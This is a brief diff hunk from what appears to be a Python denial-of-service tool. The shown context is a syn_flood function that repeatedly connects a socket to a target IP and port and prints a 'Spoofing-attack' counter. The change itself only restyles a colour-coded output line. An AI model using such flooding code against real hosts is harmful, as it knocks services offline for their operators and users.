@@ -110,7 +110,7 @@ def syn_flood(ip, port, duration):
             sock.connect((ip, port))
             sent += 1
             print(f"\033[100m\033[97m Syn flood \033[0m \033[32m{sent} \033[38;5;206m{ip} 033[33mSpoofing-attack")
-            print(f"\033[48;5;7m\033[38;5;0m Syn flood \033[0m \033[97m{sent} \033[32m{ip} \033[96mSpoofing-attack")
+            print(f"\033[48;5;7m\033[38;5;0m Syn flood \033[0m \033[97m{sent} \033[32m{ip} \033[1mSpoofing-attack\033[0m")
             sock.close()
         except OSError:
             pass
